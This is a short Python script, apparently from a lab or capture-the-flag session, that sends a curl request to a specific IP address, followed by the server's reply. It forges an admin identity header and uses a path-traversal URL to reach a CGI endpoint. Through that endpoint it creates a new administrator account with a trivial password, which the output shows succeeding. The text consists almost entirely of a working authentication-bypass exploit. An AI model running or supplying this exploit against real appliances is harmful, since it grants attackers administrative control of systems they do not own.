python3 - <<'PY'
import base64, json, subprocess
header = base64.b64encode(json.dumps({
        "username": "admin",
        "profname": "prof_admin",
        "vdom": "root",
        "loginname": "admin"
}).encode()).decode()

payload = json.dumps({
    "data": {
        "q_type": 1,
        "name": "note2",
        "access-profile": "prof_admin",
        "password": "note2",
        "comment": "automated RCE"
    }
})

cmd = [
    "curl", "--path-as-is", "-sk",
    "-H", f"CGIINFO: {header}",
    "-H", "Content-Type: application/json",
    "--data", payload,
    "https://141.95.104.153:38443/api/v2.0/cmdb/system/admin%3f/../../../cgi-bin/fwbcgi"
]
print(subprocess.run(cmd, capture_output=True, text=True).stdout)
PY

Output from the box:

{ "results": { "name": "note2", "access-profile": "prof_admin", ... } }
